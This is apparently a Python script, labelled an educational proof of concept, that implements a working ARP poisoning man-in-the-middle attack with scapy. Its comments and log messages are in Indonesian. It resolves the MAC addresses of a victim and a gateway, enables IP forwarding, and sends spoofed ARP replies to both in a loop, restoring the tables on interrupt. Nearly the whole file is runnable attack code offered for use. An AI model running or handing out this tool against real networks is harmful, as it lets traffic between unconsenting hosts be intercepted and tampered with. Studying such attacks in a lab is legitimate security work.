#!/usr/bin/env python3
"""
Advanced ARP Poison Toolset
Description: Educational Proof of Concept for Man-in-the-Middle (MITM) simulations.
"""

import scapy.all as scapy
import argparse
import time
import sys
import os
import logging

# Logging Configuration
logging.basicConfig(level=logging.INFO, format='[%(asctime)s] %(levelname)s: %(message)s', datefmt='%H:%M:%S')

def show_banner():
    """Menampilkan ASCII Art ala tools Kali Linux saat tool dijalankan."""
    banner = """
       ___  ___  ___   ___      _               
      / _ \\| _ \\| _ \\ | _ \\___ (_)___ ___ _ _   
     | (_) |   /|  _/ |  _/ _ \\| / __/ _ \\ ' \\  
      \\___/|_|_\\|_|   |_| \\___/|_\\___\\___/_||_| 
                                              
    ================================================
    [+] Advanced MITM Simulation Tool
    [+] Created by : Haykal Azriel
    [+] Version    : 1.0 (Educational PoC)
    ================================================
    """
    print(banner)

def get_arguments():
    """Mengatur command line arguments (seperti -h, -t, -g)."""
    # Custom help messages 
    parser = argparse.ArgumentParser(
        description="ARP Poison Toolset - Digunakan untuk memanipulasi tabel ARP target.",
        epilog="Contoh penggunaan: sudo ./arppoison.py -t 192.168.1.10 -g 192.168.1.1"
    )
    
    # Add arguments for target and gateway 
    parser.add_argument("-t", "--target", dest="target", required=True, help="IP Address dari Korban (Victim)")
    parser.add_argument("-g", "--gateway", dest="gateway", required=True, help="IP Address dari Router/Gateway")
    
    # Read command line arguments
    return parser.parse_args()

def toggle_ip_forwarding(enable=True):
    """Mengaktifkan atau menonaktifkan IP forwarding di sistem Linux otomatis."""
    try:
        with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
            if enable:
                f.write('1')
                logging.info("IP Forwarding diaktifkan otomatis.")
            else:
                f.write('0')
                logging.info("IP Forwarding dinonaktifkan.")
    except PermissionError:
        logging.error("Akses ditolak! Jalankan script ini sebagai root (sudo).")
        sys.exit(1)

def get_mac(ip, retries=3):
    """Mendapatkan MAC Address menggunakan ARP Request."""
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request

    for attempt in range(retries):
        answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
        if answered_list:
            return answered_list[0][1].hwsrc
        time.sleep(1)
    return None

def spoof(target_ip, gateway_ip, target_mac):
    """Mengeksekusi manipulasi tabel ARP."""
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
    scapy.send(packet, verbose=False)

def restore(destination_ip, source_ip, destination_mac, source_mac):
    """Memulihkan tabel ARP ke state aslinya."""
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)

def main():
    # 1. Show Banner 1st
    show_banner()
    
    # 2. Take command line arguments
    options = get_arguments()
    target_ip = options.target
    gateway_ip = options.gateway

    # 3. Start Exploit
    logging.info(f"Menginisialisasi serangan ke Target: {target_ip} melalui Gateway: {gateway_ip}")
    toggle_ip_forwarding(enable=True)

    logging.info("Mencari MAC Addresses (Reconnaissance)...")
    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)

    if not target_mac or not gateway_mac:
        logging.error("Gagal menemukan MAC Address. Pastikan IP benar dan host hidup.")
        toggle_ip_forwarding(enable=False)
        sys.exit(1)

    logging.info(f"Target MAC: {target_mac} | Gateway MAC: {gateway_mac}")
    logging.info("Memulai eksploitasi ARP Poisoning... (Tekan CTRL+C untuk berhenti)")
    
    packets_sent = 0
    try:
        while True:
            spoof(target_ip, gateway_ip, target_mac)
            spoof(gateway_ip, target_ip, gateway_mac)
            packets_sent += 2
            print(f"\r[*] Paket eksploitasi terkirim: {packets_sent}", end="")
            sys.stdout.flush()
            time.sleep(2)
            
    except KeyboardInterrupt:
        print("\n")
        logging.info("Sinyal interupsi terdeteksi. Memulai pemulihan sistem...")
        restore(target_ip, gateway_ip, target_mac, gateway_mac)
        restore(gateway_ip, target_ip, gateway_mac, target_mac)
        logging.info("Tabel ARP target berhasil dipulihkan.")
        toggle_ip_forwarding(enable=False)
        logging.info("Eksekusi selesai dengan aman.")

if __name__ == "__main__":
    main()